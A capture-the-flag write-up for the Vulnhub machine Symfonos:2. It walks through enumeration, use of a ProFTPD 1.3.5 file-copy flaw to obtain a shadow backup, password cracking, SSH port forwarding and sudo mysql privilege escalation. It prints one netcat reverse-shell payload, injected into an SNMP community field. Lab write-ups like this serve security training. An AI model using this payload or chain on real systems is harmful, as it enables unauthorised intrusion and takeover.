# Symfonos:2 - Writeup 

Symfonos:2 is an OSCP-like Intermediate real-life based machine from Vulnhub by Zayotic.<br />
This machine is designed to teach the importance of understanding a vulnerability.<br />

Link to the machine: [https://www.vulnhub.com/entry/symfonos-2,331/](https://www.vulnhub.com/entry/symfonos-2,331/)
<br />

## Target Discovery

Let's start by identifying our target IP address.

```
fping -agq 10.10.10.0/24
10.10.10.1
10.10.10.2
10.10.10.10
```

<br />

## Port scanning

Let's scan for open ports, running services, and version detection.

![](Pics/nmap.png)
<br />
<br />

## FTP Enumeration

Let's start by login into ftp.

![](Pics/ftp.png)
<br />
<br />

Anonymous login isn't allowed.

<br />

## Web Enumeration

Let's visit the web server.

![](Pics/web.png)
<br />
<br />

Just a picture and nothing in the source code. I run `gobuster` and `nikto` but nothing was found.<br />
<br />
<br />

## SMB Enumeration 


Tried to list any shared in the target machine and we got an `anonymous` share.<br />
Inside it, we found a `backups` directory which contains `log.txt`, download it.

![](Pics/smb.png)
<br />
<br />

It's a log file containing samba config, and as you see in the first line, there's a backup, a copy of the `shadow` file in `/var/backups/shadow.bak`.

![](Pics/smb2.png)
<br />
<br />

And there's ftp config with a user `aeolus` , and his shares as `anonymous`.

![](Pics/smb3.png)
<br />
<br />

## Getting Access

Reviewing my nmap result, the ftp is version `ProFTPD 1.3.5`, it's old, search for a known vulnerability.

![](Pics/search.png)
<br />
<br />

This vulnerability gave us the ability to copy from we could say `/var/backups/shadow.bak` to `/home/aeolus/share`, and then we could download it via smb.<br />
Let's first copy the shadow file.

![](Pics/ftp2.png)
<br />
<br />

Access `anonymous`'s share and download the file.

![](Pics/ftp3.png)
<br />
<br />

Now, let's crack `aeolus` password with `john`.

![](Pics/john.png)
<br />
<br />

ssh with `aeolus` and his password.

![](Pics/ssh.png)
<br />
<br />

Start searching for a way to escalate our privileges but nothing was found.

![](Pics/shell.png)
<br />
<br />

Upload linpeas for more enumeration.

![](Pics/lin.png)
<br />
<br />

We got apache running with `cronus` perm.

![](Pics/lin2.png)
<br />
<br />

This machine is listening on port `8080` which is allowed for localhost only.

![](Pics/lin3.png)
<br />
<br />

There’s another website running on port `8080` and to access it, we need port forwarding.<br />
exit from ssh, and enter `ssh -L 8080:127.0.0.1:8080 aeolus@IP`.

![](Pics/forward.png)
<br />
<br />

On our main host, open a browser and visit `127.0.0.1:8080`.

![](Pics/web2.png)
<br />
<br />

Tried to log in with `aeolus` and his password.

![](Pics/web3.png)
<br />
<br />

After exploring this app, search for any exploits.

![](Pics/search2.png)
<br />
<br />

There's a Metasploit and python, they are the same exploit, but I'll use the python one.<br />
Let's read the exploit.

![](Pics/exp.png)
<br />
<br />

We could do it manually, add a new device, leave everything at default and add the payload `'$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> <PORT> >/tmp/f) #` in `community`.

![](Pics/exp2.png)
<br />
<br />

Click on `Overview/Maps/Availability`, and click on `exp`.

![](Pics/web4.png)
<br />
<br />

Click on this little gear menu, then click on `Capture`

![](Pics/web5.png)
<br />
<br />

Start a listener, and click on `SNMP` tab, then `Run`.

![](Pics/exp3.png)
<br />
<br />


## Root Access

Checking `cronus` sudo permissions.

![](Pics/priv.png)
<br />
<br />

We can run `mysql` with no password, searching in [https://gtfobins.github.io](https://gtfobins.github.io)

![](Pics/priv2.png)
<br />
<br />

Let's abuse `mysql` to get root.

![](Pics/root.png)
<br />